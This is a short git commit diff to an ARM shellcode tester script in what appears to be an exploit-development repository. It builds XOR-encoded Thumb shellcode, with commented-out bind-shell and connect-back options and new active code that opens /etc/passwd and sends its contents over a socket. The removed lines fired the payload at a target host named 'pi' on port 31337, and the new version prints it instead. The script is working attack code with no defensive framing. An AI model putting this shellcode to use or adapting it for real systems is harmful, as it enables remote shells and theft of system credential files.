8207899cf31e49928895631b3fb999d5c14fb03a
alex.park <tae002@naver.com>
2014-08-29 11:18:14 +0900

    Update scgenTester.py

--- shellcode/ARM/scgenTester.py
+++ shellcode/ARM/scgenTester.py
@@ -9,19 +9,22 @@ HOST = 'pi'
 PORT = 31337
 
 def getShellcode():
-    #xsc = CompileSC(ARM_THUMB_DUPSH(sock=4), isThumb=True)
-    #xsc = CompileSC(ARM_THUMB_LISTEN(55555), isThumb=True)
-    #xsc = CompileSC(ARM_THUMB_ACCEPTLOOP(55556), isThumb=True)
-    xsc = CompileSC(ARM_THUMB_BINDSHELL(55559, sock=5, once=False), isThumb=True)
+    #xsc = CompileSC(scgen.bindshell(55559, sock=5, once=False), isThumb=True)
+    #xsc = CompileSC(scgen.connectback('127.0.0.1', 4444), isThumb=True)
+    sc1 = scgen.open_file('/etc/passwd')
+    sc2 = scgen.sendfile('r6', 4)
+    xsc = CompileSC( (sc1 + sc2), isThumb=True)
     return MakeXorShellcode(xsc)
 
+scgen = thumbSCGen()
 sc = getShellcode()
 
+print sc
 
-s = socket(AF_INET, SOCK_STREAM)
-s.connect( (HOST, PORT) )
-f = s.makefile('rw', bufsize=0)
-f.write(sc + '\n')
+#s = socket(AF_INET, SOCK_STREAM)
+#s.connect( (HOST, PORT) )
+#f = s.makefile('rw', bufsize=0)
+#f.write(sc + '\n')
 #tn = telnetlib.Telnet()
 #tn.sock = s
 #tn.interact()
